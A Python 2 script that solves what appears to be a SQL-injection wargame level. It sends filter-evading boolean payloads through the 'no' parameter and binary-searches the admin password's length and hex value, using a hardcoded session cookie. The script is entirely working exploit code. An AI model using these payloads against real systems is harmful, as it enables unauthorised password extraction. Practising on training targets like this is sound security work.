#!/usr/bin/env python

import urllib
import urllib2
import sys

URL = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
Cookie = "PHPSESSID=o4js9lcvfjuu3tts6juitjlido"


def query(Q):
    # print urllib.quote(Q)
    UURL = URL + "?no=" + urllib.quote(Q)
    req = urllib2.Request(UURL, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })

    res = urllib2.urlopen(req)
    text = res.read()
    return "<h2>Hello admin</h2>" in text

def find_length():
    left = 0
    right = 200 # (left, right]
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query('1333||NOT(id<>"admin")&&length(pw)>{}'.format(mid)):
            left = mid+1
        else:
            right = mid
    return right

def find_pw(length):
    left = 0
    right = (1<<(8*length))
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query("1333||NOT(id<>\"admin\")&&hex(pw)>{}".format(mid)):
            left = mid+1
        else:
            right = mid
    return right

LENGTH = find_length()
print LENGTH
pwHex = find_pw(LENGTH)

print pwHex
print str(pwHex).decode('hex')
